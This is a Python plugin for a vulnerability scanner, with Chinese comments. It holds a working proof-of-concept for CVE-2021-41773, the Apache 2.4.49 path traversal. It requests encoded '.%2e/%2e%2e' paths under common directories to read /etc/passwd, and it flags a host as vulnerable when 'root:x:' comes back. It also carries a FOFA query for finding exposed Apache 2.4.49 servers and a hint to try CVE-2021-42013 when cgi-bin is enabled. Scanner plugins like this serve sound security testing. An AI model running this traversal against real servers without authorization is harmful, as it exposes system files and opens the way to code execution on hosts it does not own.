# -*- coding: UTF-8 -*-
#!/usr/bin/python
import requests
from urllib.parse import urlparse
vuln_url = []
def vuln_info():
    info={
        'vuln_name': 'CVE-2021-41773',  #漏洞名称
        'vuln_referer':'https://mp.weixin.qq.com/s/mTLYkavkf13g4XosFLBjkg',  #漏洞来源
        'vuln_author':'qianxiao996',  #插件作者
        'cms_name':'Apache',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''v2.4.49 apache 独有漏洞，早期版本中并没有 ap_normalize_path 这个函数，该函数是在v2.4.49版本中引入的，正是这个函数导致了 目录穿越，在 v2.4.50 被修复了。若cgi 模块，则允许代码执行''',
        'vuln_identifier':'''CVE-2021-41773''',
        'vuln_class':'远程代码执行',#如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution':'''升级新版本''',
        'FofaQuery_type':'http', #socket、http
        'FofaQuery_link':'/', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule':'header="Apache/2.4.49"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc  1为有 0为无
        'isexp':0  #是否有exp   1为有 0为无
    }
    return info
result = {"Result":False,"Result_Info":""}
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        common_dir = ['/cgi-bin', '/assets', '/icons', '/uploads', '/img', '/image']
        for cd in common_dir:
            url_target =url+cd+"/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
            url_target=url_target.replace("://",":::").replace("//","/").replace(":::","://")
            jan_Cok(url_target,heads,func_out)
        if len(vuln_url)>0:
            result['Result']= True
            vuln_data  = '|'.join(vuln_url)
            data=''
            if '/cgi-bin' in vuln_data:
                data+='|开启了cgi,请尝试CVE-2021-42013利用！'
            result['Result_Info']= vuln_data
        else:
            result['Result_Info']= '不存在'
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')

    
def jan_Cok(target,heads,func_out):
    # print(target)
    try:
        s = requests.Session()
        req = requests.Request(method='GET' , url=target)
        prep = req.prepare()
        prep.url = target
        r = s.send(prep, verify=False)
        # detect by root on /etc/passwd 
        if "root:x:" in r.text:
            vuln_url.append(target)
            # print("[*] Vuln -> "+target)
        else:
            pass
            # print("[!] Not_Vuln -> "+target)
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')